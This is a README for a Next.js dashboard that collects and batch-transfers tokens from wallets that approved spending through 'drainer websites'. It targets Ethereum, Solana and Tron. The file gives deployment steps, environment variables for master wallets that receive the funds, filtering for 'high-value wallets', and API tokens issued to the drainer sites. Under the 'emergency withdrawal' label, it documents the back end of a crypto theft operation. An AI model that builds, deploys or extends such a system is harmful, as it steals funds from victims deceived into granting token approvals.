# Emergency Withdrawal System Dashboard

A secure, multi-chain token extraction dashboard for managing emergency withdrawals from wallets that have granted approval through external drainer websites. Built with Next.js 14, TypeScript, and PostgreSQL.

## Features

- 🔐 **Multi-layer Security**: Email authentication + admin wallet requirement
- 🌐 **Multi-chain Support**: Ethereum, Solana, and Tron
- 📊 **Advanced Filtering**: Find high-value wallets efficiently
- 🚀 **Batch Operations**: Execute multiple transfers in one transaction
- 👥 **Role-based Access**: Admin and Viewer roles
- 🔑 **API Token System**: Secure integration with drainer websites
- 📱 **Responsive Design**: Works on desktop and mobile

## Tech Stack

- **Framework**: [Next.js 14](https://nextjs.org) (App Router)
- **Language**: [TypeScript](https://www.typescriptlang.org)
- **Database**: [PostgreSQL](https://www.postgresql.org) with [Prisma ORM](https://www.prisma.io)
- **Authentication**: [NextAuth.js](https://authjs.dev) with magic links
- **Styling**: [Tailwind CSS](https://tailwindcss.com) with [Shadcn-ui](https://ui.shadcn.com)
- **State Management**: [Zustand](https://zustand-demo.pmnd.rs)
- **Blockchain**: ethers.js, @solana/web3.js, tronweb

## Prerequisites

- Node.js 18+ and npm/yarn
- PostgreSQL database
- Email server for magic links
- Wallet addresses for each chain

## Setup Guide

### Option 1: Deploy on Vercel (Recommended)

1. **Fork this repository** to your GitHub account

2. **Import to Vercel**:
   - Go to [vercel.com](https://vercel.com)
   - Click "Add New Project"
   - Import your forked repository
   - Configure environment variables (see below)
   - Deploy!

3. **Configure Database**:
   - Use Vercel Postgres or external PostgreSQL
   - Run migrations after deployment:
     ```bash
     npx prisma migrate deploy
     ```

### Option 2: Self-Host on VPS

1. **Clone and Install**:
   ```bash
   git clone https://github.com/your-repo/emergency-withdrawal-system-dashboard.git
   cd emergency-withdrawal-system-dashboard
   npm install
   ```

2. **Configure Environment**:
   ```bash
   cp .env.example .env
   # Edit .env with your values
   ```

3. **Setup Database**:
   ```bash
   npx prisma migrate deploy
   npx prisma generate
   ```

4. **Build and Start**:
   ```bash
   npm run build
   npm start
   ```

5. **Setup PM2** (for production):
   ```bash
   # Install PM2
   npm install -g pm2

   # Start application
   pm2 start npm --name "withdrawal-dashboard" -- start

   # Save PM2 configuration
   pm2 save
   pm2 startup

   # Useful PM2 commands
   pm2 status
   pm2 logs withdrawal-dashboard
   pm2 restart withdrawal-dashboard
   ```

6. **Configure Nginx** (optional):
   ```nginx
   server {
       listen 80;
       server_name your-domain.com;

       location / {
           proxy_pass http://localhost:3000;
           proxy_http_version 1.1;
           proxy_set_header Upgrade $http_upgrade;
           proxy_set_header Connection 'upgrade';
           proxy_set_header Host $host;
           proxy_cache_bypass $http_upgrade;
       }
   }
   ```

## Environment Variables

Create a `.env` file with the following variables:

```env
# NextAuth Configuration
NEXTAUTH_URL=https://your-domain.com
NEXTAUTH_SECRET=your-generated-secret-here

# Database (PostgreSQL)
DATABASE_URL=postgresql://user:password@host:5432/database?sslmode=require

# Email Configuration (for magic links)
EMAIL_SERVER_USER=noreply@your-domain.com
EMAIL_SERVER_PASSWORD=your-email-password
EMAIL_SERVER_HOST=smtp.your-domain.com
EMAIL_SERVER_PORT=465
EMAIL_FROM=noreply@your-domain.com

# JWT Secret
JWT_SECRET=your-generated-jwt-secret

# Blockchain RPC Endpoints
QUICKNODE_API_URL=https://your-ethereum-rpc-endpoint.com
NEXT_PUBLIC_SOLANA_RPC_ENDPOINT=https://your-solana-rpc-endpoint.com
NEXT_PUBLIC_TRONGRID_API_KEY=your-trongrid-api-key

# Master Wallets (IMPORTANT: These wallets will execute transfers)
NEXT_PUBLIC_ETH_MASTER_WALLET=0xYourEthereumMasterWalletAddress
NEXT_PUBLIC_SOLANA_DELEGATE_WALLET=YourSolanaDelegateWalletAddress
NEXT_PUBLIC_TRON_MASTER_WALLET=YourTronMasterWalletAddress

# Tron Contract (for batch transfers)
NEXT_PUBLIC_TRON_CONTRACT_ADDRESS=YourTronBatchTransferContract

# Optional: GitHub OAuth (if using social login)
GITHUB_ID=your-github-oauth-id
GITHUB_SECRET=your-github-oauth-secret

# Optional: Uploadthing (if using file uploads)
UPLOADTHING_SECRET=your-uploadthing-secret
UPLOADTHING_APP_ID=your-uploadthing-app-id
```

### Generating Secrets

```bash
# Generate NEXTAUTH_SECRET
openssl rand -base64 32

# Generate JWT_SECRET
openssl rand -hex 32
```

## Post-Deployment Setup

1. **Run Database Migrations**:
   ```bash
   npx prisma migrate deploy
   ```

2. **Create Admin User**:
   - Access your dashboard URL
   - Sign in with your email
   - Manually update user role in database to 'admin'

3. **Add Tokens**:
   - Go to Overview page
   - Add USDT, USDC, and other tokens for each chain

4. **Generate API Tokens**:
   - Navigate to API Tokens section
   - Generate tokens for your drainer websites

## Security Considerations

1. **Protect Master Wallets**: Never share private keys
2. **Secure Environment**: Use encrypted secrets in production
3. **Regular Backups**: Backup your database regularly
4. **Monitor Access**: Review team members and API tokens
5. **Update Dependencies**: Keep packages updated

## Documentation

- [User Guide](./USER_GUIDE.md) - Complete usage instructions
- [Quick Start](./QUICK_START.md) - 5-minute setup guide
- [Workflow Diagram](./WORKFLOW_DIAGRAM.md) - Visual system overview

## Troubleshooting

### Database Connection Issues
- Verify DATABASE_URL format
- Check PostgreSQL is running
- Ensure SSL mode matches your database

### Email Not Sending
- Verify SMTP credentials
- Check firewall rules for port 465/587
- Test with different email provider

### Wallet Connection Failed
- Ensure correct network selected
- Verify master wallet addresses
- Check RPC endpoint availability

## Support

For issues or questions:
1. Check documentation first
2. Review common issues in troubleshooting
3. Contact your system administrator

## License

This project is proprietary software. All rights reserved.

---

**⚠️ Warning**: This system handles cryptocurrency transfers. Always verify transactions and use test networks first.